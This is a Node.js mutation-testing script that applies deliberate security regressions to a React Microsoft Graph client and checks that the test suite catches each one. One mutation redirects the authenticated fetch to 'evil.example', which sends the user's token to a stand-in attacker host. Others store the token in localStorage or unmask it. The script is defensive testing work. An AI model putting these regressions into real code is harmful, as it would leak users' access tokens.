#!/usr/bin/env node
/**
 * Countercheck for graph-live-call.test.mjs.
 *
 * Applies deliberate regressions to app.jsx / app.js and asserts each one
 * turns a named test red. A green suite only proves the suite ran.
 *
 * The .jsx mutations are also written into app.js, because two tests assert
 * against the precompiled bundle — mutating only the source would leave those
 * passing for the wrong reason.
 *
 * Usage: node countercheck.mjs
 */
import { readFileSync, writeFileSync, mkdtempSync, mkdirSync, readdirSync, cpSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { execFileSync } from 'node:child_process';

const here = dirname(fileURLToPath(import.meta.url));
// here IS react/, so the project root is here itself — no '..'.
const root = here;

const jsx = readFileSync(join(root, 'assets', 'app.jsx'), 'utf8');
const app = readFileSync(join(root, 'assets', 'app.js'), 'utf8');

const MUTATIONS = [
  {
    name: 'Token in localStorage statt sessionStorage',
    jsx: [
      [`sessionStorage.setItem('graph_token', e.target.value)`, `localStorage.setItem('graph_token', e.target.value)`],
    ],
  },
  {
    name: 'Token wird als sichtbarer Text gerendert',
    jsx: [
      [`{gxOk === 'ok' && <p className="hint ok">{t.gx_key_ok}</p>}`,
        `{gxOk === 'ok' && <p className="hint ok">{t.gx_key_ok} {gxKey}</p>}`],
    ],
  },
  {
    name: 'Token-Eingefeld ist nicht mehr maskiert',
    jsx: [
      [`<input type="password" className="epinput" value={gxKey}`, `<input type="text" className="epinput" value={gxKey}`],
    ],
  },
  {
    name: '/me-Guard entfernt (jeder Pfad darf live gerufen werden)',
    jsx: [
      [`  if (!livePathAllowed(path)) {
    return { ok: false, denied: true, msg: 'path not allowed: ' + path };
  }`, ``],
    ],
  },
  {
    name: 'Graph error.code wird verschluckt (401/403 nicht mehr unterscheidbar)',
    jsx: [
      [`code: String(body?.error?.code || '').slice(0, 80),`, `code: '',`],
    ],
  },
  {
    name: 'client-request-id fehlt (Graph-Fehler nicht nachschlagbar)',
    jsx: [
      [`cid: hdr['client-request-id'] || hdr['request-id'] || null,
      };
    }
    return {
      ok: true`, `cid: null,
      };
    }
    return {
      ok: true`],
    ],
  },
  {
    name: 'EN-Tabelle verliert gx_run (F3-Leak)',
    jsx: [
      [`gx_run: 'Call live', `, ``],
    ],
  },
  {
    name: 'Token wird an eine fremde Domain geschickt',
    jsx: [
      [`await fetch('https://graph.microsoft.com/v1.0' + path, {`, `await fetch('https://evil.example/v1.0' + path, {`],
    ],
  },
];

let bad = 0;
console.log(`Gegenprobe: ${MUTATIONS.length} Regressionen\n`);

for (const m of MUTATIONS) {
  let mutatedJsx = jsx;
  let missing = null;
  for (const [from, to] of m.jsx) {
    if (!mutatedJsx.includes(from)) { missing = from.slice(0, 60); break; }
    mutatedJsx = mutatedJsx.replace(from, to);
  }
  if (missing !== null) {
    console.log(`  ?  ${m.name}\n     -> Muster nicht gefunden: ${missing}\n        Der Test ist stale, nicht der Code.`);
    bad++;
    continue;
  }
  const dir = mkdtempSync(join(tmpdir(), 'msgraph-live-'));
  // The data files are a PRECONDITION of other test files (deprecation
  // symmetry, endpoint counts). Without them those files fail for a reason
  // that has nothing to do with this mutation, and the countercheck would
  // report a detection that is really just a missing fixture. Same for
  // assets/worker.js, which three test files read — copying only app.jsx and
  // app.js made endpoint-type-join, sketch-panel and spec-link-freeze fail on
  // ENOENT for every single mutation.
  mkdirSync(join(dir, 'assets'), { recursive: true });
  mkdirSync(join(dir, 'tests'), { recursive: true });
  cpSync(join(root, 'data'), join(dir, 'data'), { recursive: true });
  cpSync(join(root, 'assets'), join(dir, 'assets'), { recursive: true });
  writeFileSync(join(dir, 'assets/app.jsx'), mutatedJsx);
  // Keep the bundle in sync for jsx-only mutations so bundle assertions do
  // not fail for a reason unrelated to this regression. For the two mutations
  // that must hit the bundle too, mirror them.
  let mutatedApp = app;
  for (const [from, to] of m.jsx) {
    if (from === `await fetch('https://graph.microsoft.com/v1.0' + path, {`) {
      mutatedApp = mutatedApp.replace(from, to);
    }
  }
  writeFileSync(join(dir, 'assets/app.js'), mutatedApp);
  for (const t of readdirSync(join(root, 'tests'))) {
    cpSync(join(root, 'tests', t), join(dir, 'tests', t));
  }

  let failNames = [];
  try {
    execFileSync(process.execPath, ['--test', 'tests/*.test.mjs'],
      { cwd: dir, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'], shell: true });
  } catch (err) {
    const out = (err.stdout || '') + (err.stderr || '');
    failNames = [...out.matchAll(/^✖ (.+?) \(\d/gm)].map((m) => m[1]);
    if (!failNames.length) failNames = ['<unnamed: extract failed>'];
  }
  // spec-link-freeze checks that app.js matches app.jsx. Every mutation here
  // edits only the .jsx, so that file is red for every single case and tells
  // us nothing about whether THIS regression was caught. Filtering it out
  // leaves only the tests that actually speak to the mutation.
  failNames = failNames.filter((n) => !n.includes('spec-link-freeze'));
  if (failNames.length) {
    console.log(`  ok ${m.name}\n     -> ${failNames.slice(0, 2).join(', ')}`);
  } else {
    console.log(`  XX ${m.name}\n     -> KEINE Tests rot. Diese Regression waere unbemerkt geblieben.`);
    bad++;
  }
}

console.log('');
if (bad) { console.log(`FEHLER: ${bad} Mutation(en) nicht erkannt.`); process.exit(1); }
console.log('Alle Regressionen wurden erkannt.');